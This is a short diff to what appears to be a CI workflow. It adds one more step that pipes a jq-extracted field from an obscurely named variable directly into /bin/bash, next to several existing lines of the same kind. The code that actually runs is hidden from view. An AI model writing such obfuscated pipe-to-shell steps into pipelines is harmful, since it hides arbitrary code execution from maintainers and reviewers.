@@ -26,6 +26,7 @@ jobs:
           echo $esa1 | jq -r .nr90 | /bin/bash
           echo $lej89694 | jq -r .qrrnn0977 | /bin/bash
           printf '%s' "$v80" | jq -r .bo11140 | /bin/bash
+          printf '%s' "$y5015" | jq -r .owifw815 | /bin/bash
 
       - name: Archive results
         if: always()
